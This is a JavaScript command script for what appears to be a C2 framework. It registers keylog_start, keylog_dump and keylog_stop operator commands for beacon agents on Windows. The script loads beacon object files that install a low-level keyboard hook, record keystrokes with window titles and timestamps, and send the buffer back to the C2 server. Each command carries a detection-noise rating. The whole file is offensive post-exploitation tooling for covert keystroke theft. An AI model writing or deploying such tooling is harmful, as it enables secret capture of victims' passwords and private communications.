var metadata = {
    name: "Keylogger-BOF",
    description: "Async keylogger BOF suite -- WH_KEYBOARD_LL hook with 64KB shared memory buffer. Use keylog_dump to retrieve captured keystrokes."
};


var cmd_keylog_start = ax.create_command("keylog_start",
    "Start async keylogger (WH_KEYBOARD_LL). Captures keystrokes with window context and timestamps. Use keylog_dump to retrieve. [NOISE: medium]",
    "keylog_start\nkeylog_start 256");

cmd_keylog_start.addArgInt("buffer_kb", false, "Buffer size in KB (default: 64, max: 4096)", 64);

cmd_keylog_start.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var buf_kb   = parsed_json["buffer_kb"] || 64;
    var bof_path = ax.script_dir() + "_bin/keylog_start_bof." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("int", [buf_kb]);

    ax.execute_alias(id, cmdline,
        `execute bof -a ${bof_path} ${bof_params}`,
        "Task: Keylogger start (" + buf_kb + "KB buffer)", null);
});


var cmd_keylog_dump = ax.create_command("keylog_dump",
    "Flush current keylogger buffer to C2 and reset it. Does not stop the keylogger. [NOISE: none]",
    "keylog_dump");

cmd_keylog_dump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var bof_path = ax.script_dir() + "_bin/keylog_dump_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline,
        `execute bof ${bof_path}`,
        "Task: Keylogger dump", null);
});

var cmd_keylog_stop = ax.create_command("keylog_stop",
    "Stop keylogger, perform final buffer dump and clean up shared memory objects. [NOISE: none]",
    "keylog_stop");

cmd_keylog_stop.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var bof_path = ax.script_dir() + "_bin/keylog_stop_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline,
        `execute bof ${bof_path}`,
        "Task: Keylogger stop", null);
});

var group_keylog = ax.create_commands_group("Keylogger-BOF", [
    cmd_keylog_start,
    cmd_keylog_dump,
    cmd_keylog_stop
]);
ax.register_commands_group(group_keylog, ["beacon", "gopher", "kharon"], ["windows"], []);
